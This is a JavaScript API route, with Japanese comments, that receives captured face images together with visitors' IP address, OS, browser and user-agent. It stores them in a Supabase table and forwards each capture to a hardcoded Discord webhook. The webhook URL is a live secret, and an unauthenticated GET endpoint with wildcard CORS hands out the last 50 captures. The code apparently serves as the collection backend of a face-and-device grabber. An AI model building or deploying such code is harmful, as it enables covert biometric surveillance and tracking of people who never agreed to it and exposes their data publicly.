// api/capture.js
import { supabase, ensureSupabaseTables } from '../../lib/supabaseClient'; // ensureSupabaseTables関数をインポート

export default async function handler(req, res) {
    console.log('Capture API called:', req.method, req.url);
    
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    try {
        // テーブルの確認と作成
        const { success, error: tableError } = await ensureSupabaseTables();
        if (!success) {
            console.error('テーブル確認/作成に失敗:', tableError);
            // 続行してみる
        }

        if (req.method === 'POST') {
            try {
                const { images, system_info, timestamp } = req.body;
                
                if (!req.body || !images) {
                    return res.status(400).json({
                        success: false,
                        error: '不正なリクエストデータ',
                        receivedBody: req.body
                    });
                }
                
                const captureData = {
                    created_at: timestamp || new Date().toISOString(),
                    images: images || [],
                    system_info: system_info || {},
                    capture_count: images ? images.length : 0
                };
                
                console.log('保存するデータ:', JSON.stringify({
                    created_at: captureData.created_at,
                    capture_count: captureData.capture_count,
                    system_info_keys: system_info ? Object.keys(system_info) : []
                }));

                // Supabaseの 'captures' テーブルにデータを挿入
                const { data, error } = await supabase
                    .from('captures')
                    .insert([captureData])
                    .select();

                if (error) {
                    console.error('Supabase挿入エラー:', error);
                    throw error;
                }
                
                console.log(`新しい顔画像をSupabaseに保存しました: ${captureData.capture_count}枚, IP: ${system_info?.ip_address || 'Unknown'}`);
                
                // Discord Webhookにも送信（非同期）
                (async () => {
                    try {
                        const webhookUrl = "https://discord.com/api/webhooks/1392713552862777487/uPdoQWpRktX36P4W4YvpjX4NmwoSOZZQdC5R3OTid-t765l6VTfMQxLK3UU_rflQCQd3";
                        const firstImage = captureData.images[0];
                        let content = `新しい顔画像が送信されました！\n` +
                            `IP: ${captureData.system_info.ip_address || 'Unknown'}\n` +
                            `OS: ${captureData.system_info.os || 'Unknown'}\n` +
                            `ブラウザ: ${captureData.system_info.browser || 'Unknown'}\n` +
                            `解像度: ${captureData.system_info.screen_resolution || 'Unknown'}\n` +
                            `User-Agent: ${captureData.system_info.user_agent || 'Unknown'}`;
                        
                        let payload;
                        if (firstImage && firstImage.startsWith('data:image/')) {
                            // Discordはbase64画像の直接送信は未対応なので、埋め込みで表示
                            payload = {
                                content,
                                embeds: [
                                    {
                                        title: "キャプチャ画像",
                                        image: { url: firstImage },
                                        color: 16098851
                                    }
                                ]
                            };
                        } else {
                            payload = { content };
                        }
                        
                        await fetch(webhookUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify(payload)
                        });
                    } catch (e) {
                        console.error('Discord Webhook送信エラー:', e);
                    }
                })();
                
                res.status(200).json({
                    success: true,
                    message: '画像を正常に受信し、Supabaseに保存しました',
                    id: data && data.length > 0 ? data[0].id : null
                });
            } catch (error) {
                console.error('画像保存エラー:', error);
                res.status(500).json({
                    success: false,
                    error: '画像の保存に失敗しました',
                    details: error.message
                });
            }
        } else if (req.method === 'GET') {
            // Supabaseからデータを取得
            const { data, error } = await supabase
                .from('captures')
                .select('*')
                .order('created_at', { ascending: false })
                .limit(50);

            if (error) {
                console.error('Supabase取得エラー:', error);
                return res.status(500).json({ error: error.message });
            }
            
            res.status(200).json(data || []);
        } else {
            res.status(405).json({ error: 'Method not allowed' });
        }
    } catch (mainError) {
        console.error('メインエラー:', mainError);
        res.status(500).json({
            error: 'サーバーエラーが発生しました',
            message: mainError.message
        });
    }
}
